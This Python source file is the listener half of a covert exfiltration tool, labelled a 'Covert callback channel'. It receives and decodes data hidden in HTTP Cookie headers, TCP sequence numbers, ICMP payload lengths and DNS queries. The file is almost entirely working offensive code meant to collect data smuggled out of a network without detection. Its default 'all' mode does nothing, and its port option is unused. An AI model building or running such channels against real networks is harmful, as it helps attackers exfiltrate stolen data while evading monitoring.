# -*- coding: utf-8 -*-

##############################3
# Written By: bitxer
# Distributed under the Apache License 2.0 (the "License").
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
# You should have received a copy of the Apache License 2.0
# along with this program.
# If not, see <http://www.apache.org/licenses/LICENSE-2.0>.
##################################################

from argparse import ArgumentParser, ArgumentTypeError
from scapy.all import sniff, ICMP
from base64 import b64decode
from sys import stdout
import socket
import struct
import ipaddress

class HTTPListener:
    def __init__(self):
        print('Initialising HTTP Listener')
        res = 'HTTP/1.1 204 No Content\r\n'.encode('utf-8')
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind(('0.0.0.0', 80))
        s.listen(5)
        while True:
            conn, addr = s.accept()
            data = conn.recv(1024).decode()
            conn.send(res)
            conn.close()
            self._decode(data)

    def _decode(self, data):
        data = data.split('\n')
        data = [x for x in data if x.startswith('Cookie')][0].strip()
        data = data.split(':')[1].strip()
        data = data[4:].strip()
        data = b64decode(data.encode()).decode()
        print(data)

class TCPListener:
    def __init__(self, key, filter='tcp port 4444'):
        print('Initialising TCP Listener')
        self._key = key
        self._data = ''
        sniff(filter=filter, prn=self._sniff)

    def _sniff(self, pkt):
        seq = pkt[0][1].seq
        if self._key * self._key == seq:
            self._print(self._data)
            self._data = ''
        else:
            self._data = self._data + chr(int(seq / self._key))

    def _print(self, data):
        print(b64decode(data.encode()).decode())

class ICMPListener:
    def __init__(self, key):
        print('Initialising ICMP Listener')
        self._key = key
        self._data = ''
        sniff(filter='icmp', prn=self._sniff)

    def _sniff(self, pkt):
        char = chr(len(pkt[ICMP].payload))
        if len(self._data) > 0 and int(self._key / ord(self._data[-1])) == ord(char):
            self._print(self._data)
            self._data = ''
        else:
            self._data = self._data + char

    def _print(self, data):
        print(b64decode(data[0::2].encode()).decode())

class DNSListener:
    def __init__(self, key, listen):
        print('Initialising DNS Listener')
        self._key = key
        self._listen = listen
        self.DNS_QUERY_SECTION_FORMAT = struct.Struct("!2H")
        self.DNS_QUERY_MESSAGE_HEADER = struct.Struct("!6H")
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.bind((self._listen, 53))
        self._data = ''
        while True:
            payload, addr = s.recvfrom(512)
            msg = self._decode_dns_message(payload)
            _raw = self._decode_data(msg)
            self._data = self._data + _raw
        
    def _print(self, data):
        print(b64decode(data.encode()).decode())

    def _decode_data(self, ip):
        ip = [o.decode() for o in ip]
        ip = '{3}.{2}.{1}.{0}'.format(*ip)
        char = int(ipaddress.ip_address(ip))
        char = char / self._key
        if int(char) == self._key:
            self._print(self._data)
            self._data = ''
            return ''
        return chr(int(char))

    def _decode_labels(self, message, offset):
        labels = []

        while True:
            length, = struct.unpack_from("!B", message, offset)

            if (length & 0xC0) == 0xC0:
                pointer, = struct.unpack_from("!H", message, offset)
                offset += 2

                return labels + self._decode_labels(message, pointer & 0x3FFF), offset

            if (length & 0xC0) != 0x00:
                raise Exception("unknown label encoding")

            offset += 1

            if length == 0:
                return labels, offset

            labels.append(*struct.unpack_from("!%ds" % length, message, offset))
            offset += length

    def _decode_question_section(self, message, offset, qdcount):
        questions = []

        for _ in range(qdcount):
            qname, offset = self._decode_labels(message, offset)

            qtype, qclass = self.DNS_QUERY_SECTION_FORMAT.unpack_from(message, offset)
            offset += self.DNS_QUERY_SECTION_FORMAT.size

            question = {"domain_name": qname,
                        "query_type": qtype,
                        "query_class": qclass}

            questions.append(question)

        return questions, offset

    def _decode_dns_message(self, message):

        id, misc, qdcount, ancount, nscount, arcount = self.DNS_QUERY_MESSAGE_HEADER.unpack_from(message)

        qr = (misc & 0x8000) != 0
        opcode = (misc & 0x7800) >> 11
        aa = (misc & 0x0400) != 0
        tc = (misc & 0x200) != 0
        rd = (misc & 0x100) != 0
        ra = (misc & 0x80) != 0
        z = (misc & 0x70) >> 4
        rcode = misc & 0xF

        offset = self.DNS_QUERY_MESSAGE_HEADER.size
        questions, offset = self._decode_question_section(message, offset, qdcount)

        result = {"id": id,
                "is_response": qr,
                "opcode": opcode,
                "is_authoritative": aa,
                "is_truncated": tc,
                "recursion_desired": rd,
                "recursion_available": ra,
                "reserved": z,
                "response_code": rcode,
                "question_count": qdcount,
                "answer_count": ancount,
                "authority_count": nscount,
                "additional_count": arcount,
                "questions": questions}
                
        return result['questions'][0]['domain_name']

def main(args):
    proto = args.protocol

    if proto == 'http':
        listen = HTTPListener()
    elif proto == 'tcp':
        listen = TCPListener(args.key)
    elif proto == 'icmp':
        listen = ICMPListener(key=args.key)
    elif proto == 'dns':
        listen = DNSListener(key=args.key, listen=args.listen)
    else:
        pass

def positiveint(val):
    try:
        if int(val) < 0:
            raise ArgumentTypeError('%s is an invalid value'%val)
    except:
        raise ArgumentTypeError('%s is an invalid value'%val)
    return int(val)

if __name__ == '__main__':
    parser = ArgumentParser(description="Covert callback channel")
    parser.add_argument('-l', '--listen', metavar='ip', default='127.0.0.1', help='IP address to listen on')
    parser.add_argument('-p', '--port', metavar='port', default=4444, type=positiveint, help='Destination port number for tcp-based covert channel')
    parser.add_argument('-k', '--key', metavar='key', default=65535, type=positiveint, help='Key used to decrypt message send through TCP-based covert channel')
    parser.add_argument('-t', '--protocol', metavar='proto', default='all', choices=['http', 'tcp', 'icmp', 'dns', 'all'], help='Protocol to listen for connection on')
    args = parser.parse_args()
    main(args)
